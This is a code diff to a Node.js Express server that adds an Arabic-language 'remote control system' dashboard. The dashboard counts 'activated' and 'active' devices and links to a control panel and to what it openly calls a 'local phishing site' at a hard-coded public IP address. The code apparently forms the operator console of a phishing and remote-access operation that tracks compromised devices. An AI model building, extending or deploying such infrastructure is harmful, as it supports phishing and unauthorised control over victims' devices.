@@ -121,6 +121,136 @@ app.get('/auto-activate', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
+// لوحة التحكم
+app.get('/dashboard', (req, res) => {
+    res.send(`
+    <!DOCTYPE html>
+    <html lang="ar" dir="rtl">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>لوحة التحكم - Control Dashboard</title>
+        <style>
+            body { 
+                font-family: Arial, sans-serif; 
+                margin: 0; 
+                padding: 20px; 
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                color: white;
+                min-height: 100vh;
+            }
+            .container { 
+                max-width: 1200px; 
+                margin: 0 auto; 
+                background: rgba(255,255,255,0.1); 
+                padding: 30px; 
+                border-radius: 15px; 
+                backdrop-filter: blur(10px);
+                box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+            }
+            .header { text-align: center; margin-bottom: 30px; }
+            .stats { 
+                display: grid; 
+                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); 
+                gap: 20px; 
+                margin-bottom: 30px;
+            }
+            .stat-card { 
+                background: rgba(255,255,255,0.2); 
+                padding: 20px; 
+                border-radius: 10px; 
+                border: 1px solid rgba(255,255,255,0.3);
+                text-align: center;
+            }
+            .stat-number { font-size: 2em; font-weight: bold; color: #4CAF50; }
+            .links { 
+                display: grid; 
+                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
+                gap: 15px;
+            }
+            .link { 
+                background: rgba(255,255,255,0.2); 
+                padding: 15px; 
+                border-radius: 10px; 
+                text-decoration: none; 
+                color: #FFD700; 
+                text-align: center;
+                transition: all 0.3s ease;
+            }
+            .link:hover { 
+                background: rgba(255,255,255,0.3); 
+                transform: translateY(-2px);
+            }
+            .status { color: #4CAF50; font-weight: bold; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="header">
+                <h1>🎛️ لوحة التحكم المتقدمة</h1>
+                <p>نظام التحكم عن بعد المتطور</p>
+            </div>
+            
+            <div class="stats">
+                <div class="stat-card">
+                    <div class="stat-number" id="deviceCount">-</div>
+                    <div>الأجهزة المفعلة</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="activeCount">-</div>
+                    <div>الأجهزة النشطة</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="uptime">-</div>
+                    <div>وقت التشغيل</div>
+                </div>
+            </div>
+            
+            <div class="links">
+                <a href="/" class="link">🏠 الصفحة الرئيسية</a>
+                <a href="/health" class="link">💚 فحص الصحة</a>
+                <a href="/api/devices" class="link">📱 قائمة الأجهزة</a>
+                <a href="/admin/stats" class="link">📊 إحصائيات المسؤول</a>
+                <a href="http://3.12.82.200:8081" class="link">🎛️ لوحة التحكم المحلية</a>
+                <a href="http://3.12.82.200:3000" class="link">🎣 موقع التصيد المحلي</a>
+            </div>
+        </div>
+        
+        <script>
+            // تحديث الإحصائيات
+            async function updateStats() {
+                try {
+                    const response = await fetch('/api/devices');
+                    const data = await response.json();
+                    if (data.success) {
+                        document.getElementById('deviceCount').textContent = data.count;
+                        document.getElementById('activeCount').textContent = data.devices.filter(d => d.status === 'active').length;
+                    }
+                } catch (error) {
+                    console.error('خطأ في تحديث الإحصائيات:', error);
+                }
+            }
+            
+            // تحديث وقت التشغيل
+            function updateUptime() {
+                const startTime = Date.now() - (performance.now() || 0);
+                const uptime = Math.floor((Date.now() - startTime) / 1000);
+                const hours = Math.floor(uptime / 3600);
+                const minutes = Math.floor((uptime % 3600) / 60);
+                document.getElementById('uptime').textContent = \`\${hours}h \${minutes}m\`;
+            }
+            
+            // تحديث كل 5 ثوان
+            updateStats();
+            updateUptime();
+            setInterval(updateStats, 5000);
+            setInterval(updateUptime, 1000);
+        </script>
+    </body>
+    </html>
+    `);
+});
+
 // واجهة API للتفعيل التلقائي
 app.post('/api/auto-activate', async (req, res) => {
     try {
